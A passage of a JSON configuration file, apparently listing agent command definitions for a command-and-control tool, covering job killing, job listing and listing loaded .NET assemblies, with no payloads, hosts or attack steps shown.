              "type": "String",
              "hint": "The Job Id for the running job to be killed",
              "choices": "",
              "required": true,
              "name": "job_id"
            }
          ],
          "attack": [],
          "artifacts": [],
          "files": [],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "listloaded",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Retrieve a list of .NET assemblies loaded via the loadassembly command. ",
          "cmd": "listloaded",
          "parameters": [],
          "attack": [],
          "artifacts": [],
          "files": [],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "jobs",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Retrieve a list of currently running jobs",
          "cmd": "jobs",
          "parameters": [],
          "attack": [],
          "artifacts": [],
          "files": [],
          "transforms": []
        }
      ]
    }
  ]
}